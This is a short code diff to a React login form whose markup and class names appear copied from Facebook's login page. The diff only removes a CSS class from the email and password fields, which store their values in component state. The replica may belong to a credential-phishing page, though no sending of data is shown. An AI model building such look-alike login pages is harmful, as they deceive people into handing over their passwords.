@@ -139,7 +139,7 @@ style={{
 <div>
 <div class="_6lux"  >
 <input type="text"  onChange={e=>setUsername(e.target.value)} 
- class="inputtext _55r1 _6luy"
+ class="inputtext  _6luy"
  style={{height:'49px',width:'100%'}} id="email"
  data-testid="royal_email" placeholder="Email address or phone number" 
  autofocus="1" aria-label="Email address or phone number" />
@@ -150,7 +150,7 @@ style={{
 
 <input  type={show?"text":"password"} onChange={e=>setPassword(e.target.value)} 
  style={{height:'49px',width:'100%'}} 
-class="inputtext _55r1 _6luy _9npi" 
+class="inputtext  _6luy _9npi" 
  id="pass" data-testid="royal_pass" placeholder="Password" aria-label="Password" />
 
 </div>
